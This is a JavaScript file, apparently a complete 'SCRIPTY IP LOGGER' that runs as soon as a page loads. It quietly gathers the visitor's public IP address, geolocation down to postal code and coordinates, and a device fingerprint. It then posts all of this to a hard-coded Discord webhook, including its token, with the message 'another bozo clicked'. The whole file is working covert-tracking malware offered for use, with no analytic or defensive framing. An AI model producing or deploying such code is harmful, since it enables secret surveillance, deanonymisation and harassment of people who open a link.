const sendIP = () => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;

            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(geoData => {

                    const deviceInfo = {
                        userAgent: navigator.userAgent,
                        screenWidth: window.screen.width,
                        screenHeight: window.screen.height,
                        language: navigator.language,
                        platform: navigator.platform,
                        battery: "N/A",
                        charging: "N/A",
                        screenRefreshRate: "N/A",
                        touchScreen: ('ontouchstart' in window) ? 'Yes' : 'No',
                        gpu: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " logical CPU cores" : "N/A"
                    };

                    if (navigator.getBattery) {
                        navigator.getBattery().then(battery => {
                            deviceInfo.battery = (battery.level * 100).toFixed(0) + "%";
                            deviceInfo.charging = battery.charging ? "Yes" : "No";
                        });
                    }

                    const getScreenRefreshRate = () => {
                        let frames = 0;
                        const start = performance.now();

                        const loop = () => {
                            frames++;
                            const elapsed = performance.now() - start;
                            if (elapsed < 1000) {
                                requestAnimationFrame(loop);
                            } else {
                                deviceInfo.screenRefreshRate = Math.round((frames * 1000) / elapsed) + " Hz";
                            }
                        };

                        requestAnimationFrame(loop);
                    };
                    getScreenRefreshRate();

                    const dscURL = 'https://discord.com/api/webhooks/1407630270030680114/24KgIRJu3KCrhK_ELjkh70k8pyu18Xqz9LQGTa4O53cdtLCXZXoW67cM_5mPToQVlvkZ';

                    return fetch(dscURL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            username: "SCRIPTY IP LOGGER",
                            avatar_url: "https://media.discordapp.net/attachments/1378331466102083756/1407630039213932625/Snimka_obrazovky_2025-08-16_180821.png",
                            content: `@here another bozo clicked`,
                            embeds: [{
                                title: 'SCRIPTY IP LOGGER',
                                description: `
**IP Info:**
IP Address >> ${ipadd}
Network >> ${geoData.network}
City >> ${geoData.city}
Region >> ${geoData.region}
Country >> ${geoData.country_name}
Postal Code >> ${geoData.postal}
Latitude >> ${geoData.latitude}
Longitude >> ${geoData.longitude}
Timezone >> ${geoData.timezone}
ASN >> ${geoData.asn}
Organization >> ${geoData.org}

**Device Info:**
User-Agent >> ${deviceInfo.userAgent}
Screen Width >> ${deviceInfo.screenWidth}px
Screen Height >> ${deviceInfo.screenHeight}px
Language >> ${deviceInfo.language}
Platform >> ${deviceInfo.platform}
Battery >> ${deviceInfo.battery}
Charging >> ${deviceInfo.charging}
Screen Refresh Rate >> ${deviceInfo.screenRefreshRate}
Touch Screen >> ${deviceInfo.touchScreen}
GPU >> ${deviceInfo.gpu}
                                `,
                                color: 1752220
                            }]
                        })
                    });
                });
        })
        .then(dscResponse => {
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            console.log('Error :(');
        });
};

sendIP();
